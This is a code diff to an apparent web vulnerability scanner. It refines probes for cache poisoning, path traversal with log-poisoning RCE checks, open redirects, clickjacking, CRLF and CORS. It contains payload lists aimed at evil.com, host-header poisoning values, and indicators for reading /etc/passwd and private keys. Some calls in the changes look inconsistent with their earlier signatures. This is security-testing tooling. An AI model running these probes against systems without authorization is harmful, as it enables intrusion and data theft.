@@ -8,7 +8,7 @@ import urllib.error
 import urllib.parse
 import urllib.request
 from pathlib import Path
-from typing import Any, Dict, List, Optional, Set
+from typing import Any, Dict, List, Optional, Set, Tuple
 
 from vulnforge.phases.helpers import (
     _SKIP_PARAMS,
@@ -61,7 +61,7 @@ async def phase_28_CACHED(
     _out = outdir / "cache_poison.txt"
     if _out.exists() and not force:
         return {"28-CACHED": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 28-CACHED: web cache poisoning/deception probes")
+    log("INFO", "Phase 28-CACHED: web cache poisoning/deception probes")
     findings: List[str] = []
     cp_urlopen = _get_urlopener()
     _cp_extra_headers = _extra_headers_dict()
@@ -72,11 +72,18 @@ async def phase_28_CACHED(
         : _PIPELINE_CFG.sample_hosts_cached
     ]
     if not targets:
-        log("warn", "28-CACHED: no HTTP targets; skipping")
+        log("WARNING", "28-CACHED: no HTTP targets; skipping")
         return {"28-CACHED": str(_out), "count": 0}
 
     async def _probe_cached(url: str) -> List[str]:
         results: List[str] = []
+
+        async def _clean_fetch() -> Tuple[int, Any, bytes]:
+            clean_req = urllib.request.Request(
+                url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers}
+            )
+            return await _async_urlopen(cp_urlopen, clean_req, timeout=10)
+
         try:
             base_req = urllib.request.Request(
                 url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers}
@@ -89,9 +96,8 @@ async def phase_28_CACHED(
                 or "age:" in str(base_headers).lower()
                 or "cf-cache" in str(base_headers).lower()
             )
-            if not base_cached:
-                return results
-            results.append(f"[cache-detected] {url} — caching headers present")
+            if base_cached:
+                results.append(f"[cache-detected] {url} — caching headers present")
             for hdr in _CACHE_POISON_HEADERS:
                 try:
                     poison_req = urllib.request.Request(
@@ -107,10 +113,26 @@ async def phase_28_CACHED(
                         cp_urlopen, poison_req, timeout=10
                     )
                     p_str = str(p_headers).lower()
+                    if p_body:
+                        p_str += p_body.decode("utf-8", errors="ignore").lower()
                     if "evil.example.com" in p_str:
-                        results.append(
-                            f"[cache-poison-candidate] {url} via {hdr}: evil.example.com reflected in headers"
-                        )
+                        try:
+                            _, clean_headers, clean_body = await _clean_fetch()
+                        except asyncio.CancelledError:
+                            raise
+                        except Exception:
+                            clean_headers, clean_body = {}, b""
+                        clean_str = str(clean_headers).lower()
+                        if clean_body:
+                            clean_str += clean_body.decode("utf-8", errors="ignore").lower()
+                        if "evil.example.com" in clean_str:
+                            results.append(
+                                f"[cache-poison-candidate] {url} via {hdr}: evil.example.com persisted in clean follow-up request (cached)"
+                            )
+                        else:
+                            results.append(
+                                f"[cache-poison-info] {url} via {hdr}: evil.example.com reflected but not cached"
+                            )
                         break
                 except asyncio.CancelledError:
                     raise
@@ -156,7 +178,10 @@ async def phase_28_CACHED(
             )
             for ext in [".css", ".js", ".png"]:
                 try:
-                    wcd_url = url.rstrip("/") + ext
+                    wcd_parsed = urllib.parse.urlparse(url)
+                    wcd_url = urllib.parse.urlunparse(
+                        wcd_parsed._replace(path=(wcd_parsed.path.rstrip("/") or "/") + ext)
+                    )
                     wcd_req = urllib.request.Request(
                         wcd_url,
                         method="GET",
@@ -176,7 +201,7 @@ async def phase_28_CACHED(
                             )
                         ):
                             results.append(
-                                f"[wcd-candidate] {url}{ext} — static extension trick returns user data"
+                                f"[wcd-candidate] {wcd_url} — static extension trick returns user data"
                             )
                 except asyncio.CancelledError:
                     raise
@@ -198,9 +223,11 @@ async def phase_28_CACHED(
                         cp_urlopen, conf_req, timeout=10
                     )
                     if conf_body != base_body:
-                        results.append(
-                            f"[cache-key-confusion] {url} — double-encoded param produces different response"
-                        )
+                        _, _, clean_body = await _clean_fetch()
+                        if clean_body == conf_body:
+                            results.append(
+                                f"[cache-key-confusion] {url} — double-encoded param cached and served to normal request"
+                            )
             except asyncio.CancelledError:
                 raise
             except Exception:
@@ -218,9 +245,11 @@ async def phase_28_CACHED(
                         cp_urlopen, semi_req, timeout=10
                     )
                     if semi_body != base_body:
-                        results.append(
-                            f"[cache-key-confusion] {url} — semicolons produce different cache key"
-                        )
+                        _, _, clean_body = await _clean_fetch()
+                        if clean_body == semi_body:
+                            results.append(
+                                f"[cache-key-confusion] {url} — semicolons cached and served to normal request"
+                            )
             except asyncio.CancelledError:
                 raise
             except Exception:
@@ -236,9 +265,11 @@ async def phase_28_CACHED(
                     cp_urlopen, post_req, timeout=10
                 )
                 if po_body == base_body and "x-cache" in str(po_headers).lower():
-                    results.append(
-                        f"[cache-key-confusion] {url} — POST request produces same cache as GET"
-                    )
+                    _, clean_headers, clean_body = await _clean_fetch()
+                    if clean_body == base_body and "x-cache" in str(clean_headers).lower():
+                        results.append(
+                            f"[cache-key-confusion] {url} — POST request produces same cache as GET"
+                        )
             except asyncio.CancelledError:
                 raise
             except Exception:
@@ -318,41 +349,55 @@ async def phase_28_CACHED(
             raise
         except Exception:
             pass
-        # Unkeyed cookie poisoning: varying cookies should not affect cache key
+        # Unkeyed cookie poisoning: a reflected cookie canary served from cache
         try:
-            cookie_val = "tracking=" + base64.b64encode(os.urandom(8)).decode()
+            cookie_canary = base64.b64encode(os.urandom(8)).decode()
+            cookie_val = "tracking=" + cookie_canary
             cookie_req = urllib.request.Request(
                 url,
                 method="GET",
                 headers={"User-Agent": "Mozilla/5.0", "Cookie": cookie_val, **_cp_extra_headers},
             )
-            _, _, cb = await _async_urlopen(cp_urlopen, cookie_req, timeout=10)
-            if cb == base_body:
-                results.append(
-                    f"[cache-cookie-unkeyed] {url} — varying cookie produces same response (unkeyed cookie in cache key)"
-                )
+            _, cookie_headers, cb = await _async_urlopen(cp_urlopen, cookie_req, timeout=10)
+            cookie_str = (cb or b"").decode("utf-8", errors="ignore") + str(cookie_headers).lower()
+            if cookie_canary in cookie_str:
+                _, clean_headers, clean_body = await _clean_fetch()
+                clean_str = (clean_body or b"").decode("utf-8", errors="ignore") + str(
+                    clean_headers
+                ).lower()
+                if cookie_canary in clean_str:
+                    results.append(
+                        f"[cache-cookie-unkeyed] {url} — cookie canary served from cache to a cookie-less request"
+                    )
+        except asyncio.CancelledError:
+            raise
         except Exception:
             pass
-        # Vary header poisoning: different X-Forwarded-Host values should produce different cached entries
+        # Vary header poisoning: reflected X-Forwarded-Host served from cache
         try:
-            vary_ips = ["10.0.0.1", "10.0.0.2", "10.0.0.3"]
-            vary_bodies = []
-            for vip in vary_ips:
-                v_req = urllib.request.Request(
-                    url,
-                    method="GET",
-                    headers={
-                        "User-Agent": "Mozilla/5.0",
-                        "X-Forwarded-Host": vip,
-                        **_cp_extra_headers,
-                    },
-                )
-                _, _, vb = await _async_urlopen(cp_urlopen, v_req, timeout=10)
-                vary_bodies.append(vb)
-            if len(set(str(b) for b in vary_bodies)) == 1:
-                results.append(
-                    f"[cache-vary-bypass] {url} — X-Forwarded-Host variations return same body (Vary header may be ignored)"
-                )
+            vary_canary = "vary" + base64.b64encode(os.urandom(6)).decode().rstrip("=")
+            v_req = urllib.request.Request(
+                url,
+                method="GET",
+                headers={
+                    "User-Agent": "Mozilla/5.0",
+                    "X-Forwarded-Host": vary_canary,
+                    **_cp_extra_headers,
+                },
+            )
+            _, vh, vb = await _async_urlopen(cp_urlopen, v_req, timeout=10)
+            vary_str = (vb or b"").decode("utf-8", errors="ignore") + str(vh).lower()
+            if vary_canary in vary_str:
+                _, clean_headers, clean_body = await _clean_fetch()
+                clean_str = (clean_body or b"").decode("utf-8", errors="ignore") + str(
+                    clean_headers
+                ).lower()
+                if vary_canary in clean_str:
+                    results.append(
+                        f"[cache-vary-bypass] {url} — X-Forwarded-Host reflected and served from cache (Vary ignored)"
+                    )
+        except asyncio.CancelledError:
+            raise
         except Exception:
             pass
         # Cache key manipulation via X-Original-URL / X-Rewrite-URL with different paths
@@ -385,7 +430,7 @@ async def phase_28_CACHED(
         findings.append("[cached] No cache poisoning candidates detected (expected)")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"28-CACHED: {len(findings)} cache probes → {out}")
+    log("OK", f"28-CACHED: {len(findings)} cache probes → {out}")
     return {"28-CACHED": str(out), "count": len(findings)}
 
 
@@ -402,14 +447,14 @@ async def phase_30_LFI(
     _out = outdir / "lfi.txt"
     if _out.exists() and not force:
         return {"30-LFI": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 30-LFI: path traversal / local file inclusion probes")
+    log("INFO", "Phase 30-LFI: path traversal / local file inclusion probes")
     findings: List[str] = []
     _lfi_urlopen = _get_urlopener()
     _lfi_extra_headers = _extra_headers_dict()
     urls_file = outdir / "urls_all.txt"
     all_urls = read_lines(urls_file) if urls_file.exists() else []
     if not all_urls:
-        log("warn", "30-LFI: no URLs; skipping")
+        log("WARNING", "30-LFI: no URLs; skipping")
         return {"30-LFI": str(_out), "count": 0}
     # Identify file-read parameters
     file_params = [
@@ -447,7 +492,7 @@ async def phase_30_LFI(
         param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)]
     param_urls = param_urls[: _PIPELINE_CFG.sample_urls_lfi]
     if not param_urls:
-        log("warn", "30-LFI: no parameter-bearing URLs; skipping")
+        log("WARNING", "30-LFI: no parameter-bearing URLs; skipping")
         return {"30-LFI": str(_out), "count": 0}
     findings.append(f"target_urls={len(param_urls)}")
     lfi_payloads = [
@@ -575,44 +620,24 @@ async def phase_30_LFI(
         "/proc/self/root/etc/passwd",
     ]
     lfi_indicators = [
-        "root:",
-        "root:x:",
-        "daemon:",
-        "bin:",
-        "sys:",
-        "nobody:",
+        "root:x:0:0:",
+        "daemon:x:1:1:",
+        "bin:x:2:2:",
+        "sys:x:3:3:",
+        "nobody:x:",
+        "www-data:x:",
+        "mysql:x:",
+        "postgres:x:",
         "[extensions]",
         "[fonts]",
-        "load average",
-        "uptime",
-        "www-data",
-        "wwwrun",
-        "localhost",
-        "nameserver",
         "ssh-rsa",
         "ssh-dss",
         "BEGIN RSA PRIVATE KEY",
+        "BEGIN PRIVATE KEY",
         "MIIE",
-        "mysql:",
-        "postgres:",
-        "admin:",
-        "windowssystem32",
-        "[drivers]",
-        "running kernel",
         "<configuration>",
         "<web-app",
-        "<?xml ",
         "vulnforge_test",
-        "uid=",
-        "gid=",
-        "groups=",
-        "cgroup",
-        "::1",
-        "127.0.0.1",
-        "127.0.1.1",
-        "^name",
-        "^hosts",
-        "^localhost",
     ]
 
     async def _probe_lfi(url: str) -> List[str]:
@@ -635,7 +660,7 @@ async def phase_30_LFI(
         for pname in qs:
             if not any(fp in pname.lower() for fp in file_params):
                 continue
-            for payload in lfi_payloads[: min(len(lfi_payloads), 10)]:
+            for payload in lfi_payloads:
                 await _throttle_rate()
                 encoded_payload = urllib.parse.quote(payload, safe="")
                 query_parts = []
@@ -718,9 +743,6 @@ async def phase_30_LFI(
                         headers=poison_headers,
                     )
                     await _async_urlopen(_lfi_urlopen, req, timeout=10)
-                    findings.append(
-                        f"[log-poison-injected] {log_test_url} - User-Agent={payload[:30]} {hdr_name}={hdr_default}"
-                    )
                 except asyncio.CancelledError:
                     raise
                 except Exception:
@@ -761,9 +783,9 @@ async def phase_30_LFI(
                                 findings.append(
                                     f"[log-poison-rce] {test_log_url} - log poisoning RCE confirmed via {log_file}"
                                 )
-                            elif log_status == 200 and len(log_body) > 500:
+                            elif any(p in log_text for p in log_poison_payloads):
                                 findings.append(
-                                    f"[log-poison-candidate] {test_log_url} - log file {log_file} accessible (HTTP {log_status}, {len(log_body)} bytes)"
+                                    f"[log-poison-candidate] {test_log_url} - injected User-Agent payload reflected in {log_file}"
                                 )
                             break
                 except asyncio.CancelledError:
@@ -774,34 +796,72 @@ async def phase_30_LFI(
         findings.append("[result] No LFI vulnerabilities detected")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"30-LFI: {len(findings)} findings → {out}")
+    log("OK", f"30-LFI: {len(findings)} findings → {out}")
     return {"30-LFI": str(_out), "count": len(findings)}
 
 
-_OPENREDIR_PAYLOADS = [
-    ("url", "https://evil.com"),
-    ("next", "https://evil.com"),
-    ("redirect", "https://evil.com"),
-    ("redirect_uri", "https://evil.com"),
-    ("return", "https://evil.com"),
-    ("return_to", "https://evil.com"),
-    ("return_url", "https://evil.com"),
-    ("target", "https://evil.com"),
-    ("dest", "https://evil.com"),
-    ("destination", "https://evil.com"),
-    ("redir", "https://evil.com"),
-    ("redirect_url", "https://evil.com"),
-    ("rurl", "https://evil.com"),
-    ("link", "https://evil.com"),
-    ("goto", "https://evil.com"),
-    ("out", "https://evil.com"),
-    ("view", "https://evil.com"),
-    ("file", "https://evil.com"),
-    ("load", "https://evil.com"),
-    ("path", "//evil.com"),
-    ("url", "//evil.com"),
-    ("next", "//evil.com"),
+_OPENREDIR_PARAMS = [
+    "url",
+    "next",
+    "redirect",
+    "redirect_uri",
+    "redirect_url",
+    "return",
+    "return_to",
+    "return_url",
+    "returnurl",
+    "ret",
+    "target",
+    "target_url",
+    "dest",
+    "destination",
+    "destination_url",
+    "redir",
+    "rurl",
+    "link",
+    "goto",
+    "out",
+    "view",
+    "file",
+    "load",
+    "path",
+    "continue",
+    "callback",
+    "redirect_to",
+    "back",
+    "ref",
+    "referer",
+    "referrer",
 ]
+
+_OPENREDIR_PAYLOADS = [
+    "https://evil.com",
+    "//evil.com",
+    "\\\\evil.com",
+    "https:%2f%2fevil.com",
+    "%2f%2fevil.com",
+    "https://evil.com.evil2.com",
+]
+
+
+def _open_redirect_host(value: str) -> Optional[str]:
+    loc = value.strip().replace("\\", "/")
+    parsed = urllib.parse.urlparse(loc)
+    if parsed.hostname:
+        return parsed.hostname.lower()
+    if loc.startswith("//"):
+        hostname = urllib.parse.urlparse("https:" + loc).hostname
+        return hostname.lower() if hostname else None
+    return None
+
+
+def _redirect_target_hosts(payload: str) -> Set[str]:
+    hosts: Set[str] = set()
+    for variant in (payload, urllib.parse.unquote(payload)):
+        host = _open_redirect_host(variant)
+        if host:
+            hosts.add(host)
+    return hosts
 
 
 async def phase_31_OPENREDIR(
@@ -817,11 +877,11 @@ async def phase_31_OPENREDIR(
     _out = outdir / "open_redirect.txt"
     if _out.exists() and not force:
         return {"31-OPENREDIR": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 31-OPENREDIR: open redirect detection")
+    log("INFO", "Phase 31-OPENREDIR: open redirect detection")
     urls = outdir / "urls_all.txt"
     all_urls = read_lines(urls) if urls.exists() else []
     if not all_urls:
-        log("warn", "31-OPENREDIR: no URLs; skipping")
+        log("WARNING", "31-OPENREDIR: no URLs; skipping")
         return {"31-OPENREDIR": str(_out), "count": 0}
     findings: List[str] = []
     _or_urlopen = _get_urlopener()
@@ -837,47 +897,73 @@ async def phase_31_OPENREDIR(
         for param_name in qs:
             if param_name.lower() in _SKIP_PARAMS:
                 continue
-            for target_param, redirect_val in _OPENREDIR_PAYLOADS:
-                if param_name.lower() == target_param:
-                    test_qs = qs.copy()
-                    test_qs[param_name] = [redirect_val]
-                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
-                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
-                    try:
-                        req = urllib.request.Request(
-                            test_url,
-                            method="GET",
-                            headers={"User-Agent": "Mozilla/5.0", **_or_extra_headers},
+            if param_name.lower() not in _OPENREDIR_PARAMS:
+                continue
+            for redirect_val in _OPENREDIR_PAYLOADS:
+                test_qs = qs.copy()
+                test_qs[param_name] = [redirect_val]
+                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
+                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
+                try:
+                    req = urllib.request.Request(
+                        test_url,
+                        method="GET",
+                        headers={"User-Agent": "Mozilla/5.0", **_or_extra_headers},
+                    )
+                    resp_status, resp_headers, _ = await _async_urlopen_no_redirect(req, timeout=10
+                    )
+                    location = resp_headers.get("Location", "") or resp_headers.get("location", "")
+                    if _open_redirect_host(location) in _redirect_target_hosts(redirect_val):
+                        findings.append(
+                            f"[open-redirect] {test_url} -> {location} (HTTP {resp_status})"
                         )
-                        resp_status, resp_headers, _ = await _async_urlopen_no_redirect(
-                            _or_urlopen, req, timeout=10
-                        )
-                        location = resp_headers.get("Location", "")
-                        if not location:
-                            location = resp_headers.get("location", "")
-                        if "evil.com" in location or "//evil.com" in location:
-                            findings.append(
-                                f"[open-redirect] {test_url} -> {location} (HTTP {resp_status})"
-                            )
-                    except urllib.error.HTTPError as e:
-                        location = e.headers.get("Location", "") or e.headers.get("location", "")
-                        if "evil.com" in location or "//evil.com" in location:
-                            findings.append(
-                                f"[open-redirect] {test_url} -> {location} (HTTP {e.code})"
-                            )
-                    except asyncio.CancelledError:
-                        raise
-                    except Exception:
-                        continue
+                except urllib.error.HTTPError as e:
+                    location = e.headers.get("Location", "") or e.headers.get("location", "")
+                    if _open_redirect_host(location) in _redirect_target_hosts(redirect_val):
+                        findings.append(f"[open-redirect] {test_url} -> {location} (HTTP {e.code})")
+                except asyncio.CancelledError:
+                    raise
+                except Exception:
+                    continue
     if not findings:
         findings.append("[open-redirect] No open redirect candidates detected (expected)")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"31-OPENREDIR: {len(findings)} open redirect probes -> {out}")
+    log("OK", f"31-OPENREDIR: {len(findings)} open redirect probes -> {out}")
     return {"31-OPENREDIR": str(out), "count": len(findings)}
 
 
 _CLICKJACK_HEADERS_TO_CHECK = ["X-Frame-Options", "Content-Security-Policy"]
+
+
+def _xfo_effective(value: str) -> bool:
+    return value.strip().upper() in ("DENY", "SAMEORIGIN")
+
+
+def _frame_ancestors_effective(csp: str, url: str) -> bool:
+    url_host = urllib.parse.urlparse(url).hostname
+    found = False
+    for directive in csp.split(";"):
+        directive = directive.strip()
+        if not directive:
+            continue
+        dname, _, dval = directive.partition(" ")
+        if dname.strip().lower() != "frame-ancestors":
+            continue
+        found = True
+        sources = [s.strip().lower() for s in dval.split() if s.strip()]
+        if not sources:
+            return False
+        for src in sources:
+            if src in ("'none'", "'self'"):
+                continue
+            src_host = urllib.parse.urlparse(src).hostname
+            if src_host is None and "." in src:
+                src_host = src.split(":")[0]
+            if src_host and src_host == url_host:
+                continue
+            return False
+    return found
 
 
 async def phase_32_CLICKJACK(
@@ -893,7 +979,7 @@ async def phase_32_CLICKJACK(
     _out = outdir / "clickjacking.txt"
     if _out.exists() and not force:
         return {"32-CLICKJACK": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 32-CLICKJACK: clickjacking protection detection")
+    log("INFO", "Phase 32-CLICKJACK: clickjacking protection detection")
     findings: List[str] = []
     _cj_urlopen = _get_urlopener()
     _cj_extra_headers = _extra_headers_dict()
@@ -904,7 +990,7 @@ async def phase_32_CLICKJACK(
         : _PIPELINE_CFG.sample_hosts_clickjack
     ]
     if not targets:
-        log("warn", "32-CLICKJACK: no HTTP targets; skipping")
+        log("WARNING", "32-CLICKJACK: no HTTP targets; skipping")
         return {"32-CLICKJACK": str(_out), "count": 0}
     for url in targets:
         try:
@@ -914,16 +1000,13 @@ async def phase_32_CLICKJACK(
             _, resp_headers, _ = await _async_urlopen(_cj_urlopen, req, timeout=10)
             xfo = resp_headers.get("X-Frame-Options", "")
             csp = resp_headers.get("Content-Security-Policy", "")
-            has_xfo = bool(xfo)
-            has_frame_ancestors = "frame-ancestors" in csp
-            if not has_xfo and not has_frame_ancestors:
+            protected = _xfo_effective(xfo) or _frame_ancestors_effective(csp, url)
+            if not protected:
                 findings.append(
-                    f"[clickjacking-missing] {url} — no X-Frame-Options or CSP frame-ancestors"
+                    f"[clickjacking-missing] {url} — no effective X-Frame-Options or CSP frame-ancestors"
                 )
-            elif not has_xfo:
-                findings.append(
-                    f"[clickjacking-csp-only] {url} — CSP frame-ancestors present but no X-Frame-Options"
-                )
+            elif not _xfo_effective(xfo):
+                log("INFO", f"32-CLICKJACK: {url} — protected by CSP frame-ancestors only")
         except asyncio.CancelledError:
             raise
         except Exception:
@@ -932,7 +1015,7 @@ async def phase_32_CLICKJACK(
         findings.append("[clickjacking] All targets have clickjacking protection (expected)")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"32-CLICKJACK: {len(findings)} clickjacking checks -> {out}")
+    log("OK", f"32-CLICKJACK: {len(findings)} clickjacking checks -> {out}")
     return {"32-CLICKJACK": str(out), "count": len(findings)}
 
 
@@ -958,11 +1041,11 @@ async def phase_33_CRLF(
     _out = outdir / "crlf_injection.txt"
     if _out.exists() and not force:
         return {"33-CRLF": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 33-CRLF: CRLF injection / HTTP response splitting")
+    log("INFO", "Phase 33-CRLF: CRLF injection / HTTP response splitting")
     urls = outdir / "urls_all.txt"
     all_urls = read_lines(urls) if urls.exists() else []
     if not all_urls:
-        log("warn", "33-CRLF: no URLs; skipping")
+        log("WARNING", "33-CRLF: no URLs; skipping")
         return {"33-CRLF": str(_out), "count": 0}
     findings: List[str] = []
     _crlf_urlopen = _get_urlopener()
@@ -1007,8 +1090,7 @@ async def phase_33_CRLF(
                         method="GET",
                         headers={"User-Agent": "Mozilla/5.0", **_crlf_extra_headers},
                     )
-                    resp_status, resp_headers, resp_body = await _async_urlopen_no_redirect(
-                        _crlf_urlopen, req, timeout=10
+                    resp_status, resp_headers, resp_body = await _async_urlopen_no_redirect(req, timeout=10
                     )
                     body_str = resp_body.decode("utf-8", errors="ignore")
                     headers_str = str(resp_headers).lower()
@@ -1035,7 +1117,7 @@ async def phase_33_CRLF(
         findings.append("[crlf] No CRLF injection candidates detected (expected)")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"33-CRLF: {len(findings)} CRLF probes -> {out}")
+    log("OK", f"33-CRLF: {len(findings)} CRLF probes -> {out}")
     return {"33-CRLF": str(out), "count": len(findings)}
 
 
@@ -1052,11 +1134,11 @@ async def phase_34_RATELIMIT(
     _out = outdir / "rate_limiting.txt"
     if _out.exists() and not force:
         return {"34-RATELIMIT": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 34-RATELIMIT: rate limiting / brute-force protection detection")
+    log("INFO", "Phase 34-RATELIMIT: rate limiting / brute-force protection detection")
     urls = outdir / "urls_all.txt"
     all_urls = read_lines(urls) if urls.exists() else []
     if not all_urls:
-        log("warn", "34-RATELIMIT: no URLs; skipping")
+        log("WARNING", "34-RATELIMIT: no URLs; skipping")
         return {"34-RATELIMIT": str(_out), "count": 0}
     findings: List[str] = []
     _rl_urlopen = _get_urlopener()
@@ -1077,7 +1159,7 @@ async def phase_34_RATELIMIT(
                 req = urllib.request.Request(
                     url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_rl_extra_headers}
                 )
-                s, resp_h, _ = await _async_urlopen_no_redirect(_rl_urlopen, req, timeout=8)
+                s, resp_h, _ = await _async_urlopen_no_redirect(req, timeout=8)
                 statuses.append(s)
                 if s in (429, 503) or "retry-after" in str(resp_h).lower():
                     findings.append(
@@ -1099,11 +1181,20 @@ async def phase_34_RATELIMIT(
         findings.append("[rate-limit] No rate limiting checks completed")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"34-RATELIMIT: {len(findings)} rate limit checks -> {out}")
+    log("OK", f"34-RATELIMIT: {len(findings)} rate limit checks -> {out}")
     return {"34-RATELIMIT": str(out), "count": len(findings)}
 
 
 # ────────────────── Phase 35-CORSADV: Advanced CORS Testing ────────────────────
+def _cors_misconfig(acao: str, acac: str, origin: str) -> bool:
+    if not acao:
+        return False
+    allowed = [a.strip() for a in acao.split(",") if a.strip()]
+    if "*" in allowed:
+        return acac.lower() == "true"
+    return origin in allowed
+
+
 async def phase_35_CORSADV(
     outdir: Path,
     t: Tools,
@@ -1117,7 +1208,7 @@ async def phase_35_CORSADV(
     _out = outdir / "cors_advanced.txt"
     if _out.exists() and not force:
         return {"35-CORSADV": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 35-CORSADV: advanced CORS misconfiguration testing")
+    log("INFO", "Phase 35-CORSADV: advanced CORS misconfiguration testing")
     findings: List[str] = []
     _cors_urlopen = _get_urlopener()
     _cors_extra_headers = _extra_headers_dict()
@@ -1129,7 +1220,7 @@ async def phase_35_CORSADV(
     if not api_endpoints:
         api_endpoints = list(all_urls)[: _PIPELINE_CFG.sample_endpoints_corsadv]
     if not api_endpoints:
-        log("warn", "35-CORSADV: no endpoints; skipping")
+        log("WARNING", "35-CORSADV: no endpoints; skipping")
         return {"35-CORSADV": str(_out), "count": 0}
     # Corsy CORS misconfiguration scanner
     if t.has("corsy") and api_endpoints:
@@ -1166,15 +1257,32 @@ async def phase_35_CORSADV(
                 method="OPTIONS",
                 headers={"User-Agent": "Mozilla/5.0", "Origin": origin, **_cors_extra_headers},
             )
-            _, ch, _ = await _async_urlopen_no_redirect(_cors_urlopen, req, timeout=8)
+            _, ch, _ = await _async_urlopen_no_redirect(req, timeout=8)
             acao = ch.get("Access-Control-Allow-Origin", "")
             acac = ch.get("Access-Control-Allow-Credentials", "")
-
-            if origin in acao or "*" in acao:
-                creds = " with credentials" if acac == "true" else ""
+            if _cors_misconfig(acao, acac, origin):
+                creds = " with credentials" if acac.lower() == "true" else ""
                 return f"[cors-misconfig] {url} ACAO={acao} origin={origin}{creds}"
             if origin and origin.lower() in str(ch).lower() and origin != "null":
                 return f"[cors-origin-reflection] {url} origin={origin} reflected in headers"
+        except asyncio.CancelledError:
+            raise
+        except Exception:
+            pass
+        try:
+            g_req = urllib.request.Request(
+                url,
+                method="GET",
+                headers={"User-Agent": "Mozilla/5.0", "Origin": origin, **_cors_extra_headers},
+            )
+            _, gh, _ = await _async_urlopen_no_redirect(g_req, timeout=8)
+            g_acao = gh.get("Access-Control-Allow-Origin", "")
+            g_acac = gh.get("Access-Control-Allow-Credentials", "")
+            if _cors_misconfig(g_acao, g_acac, origin):
+                creds = " with credentials" if g_acac.lower() == "true" else ""
+                return f"[cors-misconfig] {url} ACAO={g_acao} origin={origin} (GET){creds}"
+            if origin and origin.lower() in str(gh).lower() and origin != "null":
+                return f"[cors-origin-reflection] {url} origin={origin} reflected in headers (GET)"
         except asyncio.CancelledError:
             raise
         except Exception:
@@ -1203,7 +1311,7 @@ async def phase_35_CORSADV(
                 method="GET",
                 headers={"User-Agent": "Mozilla/5.0", **_cors_extra_headers},
             )
-            _, _, body_bytes = await _async_urlopen_no_redirect(_cors_urlopen, req, timeout=8)
+            _, _, body_bytes = await _async_urlopen_no_redirect(req, timeout=8)
             body = body_bytes.decode("utf-8", errors="ignore")
             if test_val in body and ("(" in body and ")" in body):
                 findings.append(
@@ -1216,7 +1324,7 @@ async def phase_35_CORSADV(
                     method="GET",
                     headers={"User-Agent": "Mozilla/5.0", **_cors_extra_headers},
                 )
-                _, _, ibody_bytes = await _async_urlopen_no_redirect(_cors_urlopen, ireq, timeout=8)
+                _, _, ibody_bytes = await _async_urlopen_no_redirect(ireq, timeout=8)
                 ibody = ibody_bytes.decode("utf-8", errors="ignore")
                 if (
                     inject_val in ibody
@@ -1238,7 +1346,7 @@ async def phase_35_CORSADV(
         findings.append("[cors] No advanced CORS misconfigurations detected (expected)")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"35-CORSADV: {len(findings)} CORS checks -> {out}")
+    log("OK", f"35-CORSADV: {len(findings)} CORS checks -> {out}")
     return {"35-CORSADV": str(out), "count": len(findings)}
 
 
@@ -1317,7 +1425,7 @@ async def phase_37_FILEUPLOAD(
     _out = outdir / "file_upload.txt"
     if _out.exists() and not force:
         return {"37-FILEUPLOAD": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 37-FILEUPLOAD: file upload vulnerability testing")
+    log("INFO", "Phase 37-FILEUPLOAD: file upload vulnerability testing")
     findings: List[str] = []
     upload_urlopen = _get_urlopener()
     _fu_extra_headers = _extra_headers_dict()
@@ -1342,7 +1450,7 @@ async def phase_37_FILEUPLOAD(
                 )
     targets = list(upload_candidates)[: _PIPELINE_CFG.sample_urls_upload]
     if not targets:
-        log("warn", "37-FILEUPLOAD: no upload endpoints found; skipping")
+        log("WARNING", "37-FILEUPLOAD: no upload endpoints found; skipping")
         return {"37-FILEUPLOAD": str(_out), "count": 0}
     for ep in targets:
         for fname, content, content_type in _FILEUPLOAD_TEST_FILES:
@@ -1750,7 +1858,7 @@ async def phase_37_FILEUPLOAD(
         findings.append("[fileupload] No upload vulnerabilities detected (expected)")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"37-FILEUPLOAD: {len(findings)} upload probes -> {out}")
+    log("OK", f"37-FILEUPLOAD: {len(findings)} upload probes -> {out}")
     return {"37-FILEUPLOAD": str(out), "count": len(findings)}
 
 
@@ -1779,6 +1887,22 @@ _CSP_BYPASS_CDNS = {
 }
 
 
+def _csp_directives(csp: str) -> Dict[str, str]:
+    directives: Dict[str, str] = {}
+    for directive in csp.lower().split(";"):
+        directive = directive.strip()
+        if not directive:
+            continue
+        dname, sep, dval = directive.partition(" ")
+        directives[dname] = dval.strip() if sep else ""
+    return directives
+
+
+def _csp_source_list(directives: Dict[str, str], name: str) -> List[str]:
+    val = directives.get(name) or directives.get("default-src", "")
+    return [s for s in val.split() if s] if val else []
+
+
 async def phase_73_CSPBYPASS(
     outdir: Path,
     t: Tools,
@@ -1791,21 +1915,14 @@ async def phase_73_CSPBYPASS(
     _out = outdir / "csp_analysis.txt"
     if _out.exists() and not force:
         return {"73-CSPBYPASS": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 73-CSPBYPASS: CSP header analysis + bypass detection")
